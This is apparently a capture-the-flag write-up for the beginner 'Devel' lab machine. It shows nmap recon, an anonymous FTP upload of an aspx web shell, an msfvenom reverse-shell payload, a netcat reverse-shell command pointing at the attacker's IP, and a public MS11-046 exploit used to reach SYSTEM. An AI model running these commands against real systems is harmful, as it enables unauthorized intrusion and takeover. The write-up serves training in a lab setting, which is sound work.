## Introduction

Devel, while relatively simple, demonstrates the security risks associated with some default program configurations. It is a beginner-level machine which can be completed using publicly available exploits.

## Reconnaissance

We start executing `nmap` in order to know the ports and services running in the machine.

```shell
nmap -sSCV --min-rate=5000 -p- --open -n -Pn 10.10.10.5 -oN nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-10 15:24 CEST
Nmap scan report for 10.10.10.5
Host is up (0.043s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Nmap report us the ports _21_(ftp) and _80_(http). In this scenario ftp allows anonymouys login so let's connect. 


```shell
ls
200 PORT command successful.
150 Opening ASCII mode data connection.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete
```

Once within ftp, we can see this files. This files seem to be from a web server. We confirm this watching this in the web:

Curiously the main image has the same name as the ftp image so wen can start thinking that ftp is using the web directory.

As it's using IIS we must use a _.aspx_ in order to gain a reverse shell.

## Explotation
I made the next payload using `msfvenom`

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4  LPORT=4444 -f aspx >reverse.aspx
```


Then I upload it using ftp



![](/assets/img/Anexos/Pasted%20image%2020250410154021-1.png)

> This didn't work, when I finished the machine I realized it was because I should have used meterpreter xd, so I did it with:


I copy this _cmd.aspx_

```shell
cp /usr/share/wordlists/seclists/Web-Shells/FuzzDB/cmd.aspx .
```

Then I upload it 
```shell
ftp> put cmd.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1442 bytes sent in 0.000594 seconds (2.32 Mbytes/s)
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
04-10-25  05:51PM                 1442 cmd.aspx
```

Now we have RCE. The next step is gaining a reverse shell.

![](/assets/img/Anexos/Pasted%20image%2020250410165207-1.png)


`nc` is not installed in Windows by default, so I just copy it from **seclist** and while I'm sharing the file using `impacket`, I execute it remotely using the `cmd.aspx` in order to get a reverse shell.
```shell
cp /usr/share/wordlists/seclists/Web-Shells/FuzzDB/nc.exe .
```

```shell
\\10.10.16.4\smbFolder\nc.exe -e cmd 10.10.16.4 4444 
```

## Privilage Escalation
Now I'm in, I run `systeminfo` to know if it can be vulnerable. 
```

c:\windows\system32\inetsrv>wget
wget
'wget' is not recognized as an internal or external command,
operable program or batch file.
```

Searching in google I figure out this version is vulnerable. I use the next POC to exploit:

> [](https://github.com/n3rdh4x0r/CVE-2011-1249?tab=readme-ov-file)

```shell
 wget https://raw.githubusercontent.com/n3rdh4x0r/CVE-2011-1249/refs/heads/main/40564.c
```

```shell
i686-w64-mingw32-gcc 40564.c -o newshell.exe -lws2_32
```

Now I use `impacket` again to share it using smb.

But didn't work lmao, so I changed to this one:

- [](https://github.com/am0nsec/exploit/blob/master/windows/privs/MS11-046/ms11-046.exe)


```powershell
C:\Users\Public>copy \\10.10.16.4\smbFolder\ms11-046.exe virus.exe
copy \\10.10.16.4\smbFolder\ms11-046.exe virus.exe
        1 file(s) copied.
```

```powershell
C:\Users\Public>.\virus.exe
.\virus.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```
And were root.
